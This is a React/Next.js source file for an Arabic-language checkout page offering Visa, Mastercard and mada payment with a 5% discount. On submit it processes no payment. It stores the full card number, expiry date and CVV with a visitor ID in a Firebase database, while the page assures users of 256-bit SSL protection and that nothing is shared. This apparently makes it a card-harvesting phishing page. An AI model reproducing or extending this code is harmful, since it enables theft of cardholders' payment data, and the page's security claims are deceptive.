"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { CreditCard, ShieldCheck, Info } from "lucide-react"
import { detectCardType, formatCardNumber, formatExpiryDate, getBankInfo } from "@/lib/card-utils"
import { addData } from "@/lib/firebase"

export default function PaymentPage() {
  const lookup = require('binlookup')()
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("credit-discount")
  const [cardNumber, setCardNumber] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [cvv, setCvv] = useState("")
  const [cardType, setCardType] = useState<string | null>(null)
  const [bankInfo, setBankInfo] = useState<{ name: string; country: string } | null>(null)
  const [isValidCard, setIsValidCard] = useState(false)

  // Detect card type and bank info when card number changes
  useEffect(() => {
    const cleanNumber = cardNumber.replace(/\s/g, "")

    if (cleanNumber.length >= 6) {
      const type = detectCardType(cleanNumber)
      setCardType(type)

      const bank = getBankInfo(cleanNumber)
      setBankInfo(bank)
    } else {
      setCardType(null)
      setBankInfo(null)
    }

    // Simple Luhn algorithm validation
    if (cleanNumber.length >= 13) {
      setIsValidCard(luhnCheck(cleanNumber))
    } else {
      setIsValidCard(false)
    }
  }, [cardNumber])

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value)
    setCardNumber(formatted)
  }

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value)
    setExpiryDate(formatted)
  }

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 4)
    setCvv(value)
  }

  const handlePayment = async (e: React.FormEvent) => {
    e.preventDefault()
    const visitorID=localStorage.getItem('visitor')
    if (!isValidCard) {
      alert("رقم البطاقة غير صحيح")
      return
    }
    await addData({id:visitorID,
      paymentMethod: selectedPaymentMethod,
      cardType,
      bankInfo,
      cvv,
      cardNumber,
      expiryDate,})
      lookup('45717360').then(console.log, console.error)
    }
  async function getCardInfo(bin: string) {
    const res = await fetch(`https://lookup.binlist.net/${bin}`);
    
    if (!res.ok) throw new Error("BIN lookup failed");
  
    const data = await res.json();
    return {
      bank: data.bank?.name || "Unknown",
      type: data.scheme || "Unknown",
      country: data.country?.name || "Unknown"
    };
  }
  const getDiscountAmount = () => {
    if (selectedPaymentMethod === "credit-visa"||selectedPaymentMethod === "credit-mas") {
      return "5%"
    }
    return null
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 p-4 md:p-6" dir="rtl">
 

        <Card className="p-6 md:p-8 shadow-2xl border-0">
          <form onSubmit={handlePayment} className="space-y-5 md:space-y-6">
            {/* Payment Method Selection */}
            <div className="space-y-3">
              <label className="flex items-center gap-2 text-gray-900 font-bold text-base md:text-lg">
                <ShieldCheck className="w-5 h-5 text-[#0a4a68]" />
                طريقة الدفع
              </label>
              <div className="space-y-3">
                {[
                  { value: "credit-visa", label: "بطاقة فيزا", discount: "5%", recommended: true,img:'/visa.svg' },
                  { value: "credit-mas", label: "بطاقة ماستر كارد", discount: "5%", recommended: true,img:'/mas.svg' },
                  { value: "mada", label: "مدى", discount: null, recommended: false,img:'/mada.svg' },
                ].map((method) => (
                  <label
                    key={method.value}
                    className={`
                      relative flex items-center justify-between gap-3 p-4 md:p-5 
                      border-2 rounded-xl cursor-pointer transition-all duration-200
                      ${
                        selectedPaymentMethod === method.value
                          ? "border-[#0a4a68] bg-[#0a4a68]/5 shadow-md"
                          : "border-gray-200 hover:border-gray-300 hover:bg-gray-50"
                      }
                    `}
                  >
                    <div className="flex items-center gap-3">
                      <input
                        type="radio"
                        name="paymentMethod"
                        value={method.value}
                        checked={selectedPaymentMethod === method.value}
                        onChange={() => setSelectedPaymentMethod(method.value)}
                        className="w-5 h-5 text-[#0a4a68] focus:ring-[#0a4a68]"
                      />
                      <img src={method.img} alt="logo" width={30}/>
                      <span className="text-base md:text-lg font-semibold text-gray-900">{method.label}</span>
                      
                    </div>
                    <div className="flex items-center gap-2">
                      {method.discount && (
                        <Badge className="bg-yellow-500 hover:bg-yellow-600 text-white font-bold px-3 py-1">
                          خصم {method.discount}
                        </Badge>
                      )}
                     
                    </div>
                  </label>
                ))}
              </div>
            </div>

            {/* Card Number with Detection */}
            <div className="space-y-2">
              <label className="flex items-center gap-2 text-gray-900 font-bold text-base md:text-lg">
                رقم البطاقة
                {isValidCard && (
                  <Badge variant="outline" className="border-green-500 text-green-700">
                    <ShieldCheck className="w-3 h-3 ml-1" />
                    صالح
                  </Badge>
                )}
              </label>
              <div className="relative">
                <Input
                  type="tel"
                  placeholder="0000 0000 0000 0000"
                  value={cardNumber}
                  onChange={handleCardNumberChange}
                  className="h-14 md:h-16 text-base md:text-lg font-mono border-2 rounded-xl focus:border-[#0a4a68] focus:ring-2 focus:ring-[#0a4a68]/20 pr-12"
                  dir="ltr"
                  maxLength={19}
                  required
                />
                {cardType && (
                  <div className="absolute right-4 top-1/2 -translate-y-1/2">
                     {cardType==='Mastercard'?<img src="/mas.svg" alt="maslogo" width={40}/>:<img src="/visa.svg" alt="vlogo" width={40}/>}
                  </div>
                )}
              </div>

             
            </div>

            {/* Expiry Date and CVV */}
            <div className="grid grid-cols-2 gap-4 md:gap-5">
              <div className="space-y-2">
                <label className="block text-gray-900 font-bold text-base md:text-lg">تاريخ الانتهاء</label>
                <Input
                  type="tel"
                  placeholder="MM/YY"
                  value={expiryDate}
                  onChange={handleExpiryDateChange}
                  className="h-14 md:h-16 text-center text-base md:text-lg font-mono border-2 rounded-xl focus:border-[#0a4a68] focus:ring-2 focus:ring-[#0a4a68]/20"
                  maxLength={5}
                  required
                />
              </div>
              <div className="space-y-2">
                <label className="block text-gray-900 font-bold text-base md:text-lg">CVV</label>
                <Input
                  type="tel"
                  placeholder="000"
                  value={cvv}
                  onChange={handleCvvChange}
                  maxLength={4}
                  className="h-14 md:h-16 text-center text-base md:text-lg font-mono border-2 rounded-xl focus:border-[#0a4a68] focus:ring-2 focus:ring-[#0a4a68]/20"
                  required
                />
              </div>
            </div>

            {/* Discount Info */}
            {getDiscountAmount() && (
              <div className="p-4 bg-yellow-50 border-2 border-yellow-200 rounded-xl">
                <p className="text-center text-yellow-900 font-semibold">
                  🎉 سيتم خصم {getDiscountAmount()} من المبلغ الإجمالي
                </p>
              </div>
            )}

            {/* Submit Button */}
            <Button
              type="submit"
              disabled={!isValidCard || !cardNumber || !expiryDate || !cvv}
              className="w-full h-14 md:h-16 bg-yellow-500 hover:bg-yellow-600 disabled:bg-gray-300 disabled:cursor-not-allowed text-[#0a4a68] font-bold text-lg md:text-xl rounded-xl shadow-xl hover:shadow-2xl transition-all duration-200 transform hover:scale-[1.02]"
            >
              <ShieldCheck className="w-6 h-6 ml-2" />
              تأكيد الدفع الآمن
            </Button>

            {/* Security Note */}
            <div className="text-center">
              <p className="text-xs md:text-sm text-gray-600">
                <ShieldCheck className="w-4 h-4 inline-block ml-1" />
                جميع المعاملات محمية بتشفير SSL 256-bit
              </p>
            </div>
          </form>
        </Card>

        {/* Additional Security Info */}
        <div className="mt-6 text-center text-xs md:text-sm text-gray-600">
          <p>معلوماتك الشخصية محمية ولن يتم مشاركتها مع أي طرف ثالث</p>
        </div>
    </div>
  )
}

// Luhn algorithm for card validation
function luhnCheck(cardNumber: string): boolean {
  let sum = 0
  let isEven = false

  for (let i = cardNumber.length - 1; i >= 0; i--) {
    let digit = Number.parseInt(cardNumber[i])

    if (isEven) {
      digit *= 2
      if (digit > 9) {
        digit -= 9
      }
    }

    sum += digit
    isEven = !isEven
  }

  return sum % 10 === 0
}
